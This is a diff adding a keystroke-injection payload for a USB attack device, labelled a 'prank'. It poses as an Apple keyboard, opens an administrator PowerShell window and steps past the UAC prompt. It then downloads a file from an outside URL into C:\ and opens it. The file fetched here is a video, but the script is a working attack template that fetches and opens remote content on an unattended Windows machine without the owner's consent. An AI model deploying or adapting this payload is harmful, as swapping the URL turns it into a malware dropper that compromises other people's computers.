@@ -1,0 +1,48 @@
+# Title:        Downloads file
+# Description:  Downloads a file into C:\
+# Author:       voidf-22
+# Version:      1.0
+# Category:     Prank
+# Target:       Windows 10 (Powershell)
+# Attackmodes:	HID	
+# Notes: I left exit hanging for demonstration purposes. You can always add "Q ENTER" no qoutes at the end to close the powershell window.
+
+LED SETUP
+
+Q SET_LANGUAGE us
+
+ATTACKMODE HID VID_0X05AC PID_0X021E
+
+LED ATTACK
+
+Q DELAY 200
+#Open Admin Powershell 
+
+ATTACKMODE HID
+LED B 200
+Q GUI
+Q DELAY 500
+Q STRING POWERSHELL
+Q DELAY 1000
+Q CTRL-SHIFT ENTER
+Q DELAY 2000
+Q LEFTARROW
+Q DELAY 100
+Q ENTER
+Q DELAY 1200
+
+#Downloads item from URL and places it in C:\test.mp4. OutFile creates a file to put it in so it can be anything
+
+Q STRING "Invoke-WebRequest https://thumbs.gfycat.com/VacantPerkyDeviltasmanian-mobile.mp4 -OutFile C:\test.mp4" 
+Q DELAY 100
+Q ENTER
+Q DELAY 300
+Q STRING "Invoke-Item C:\test.mp4"
+Q ENTER
+Q STRING "exit"
+
+LED FINISH
+
+
+
+
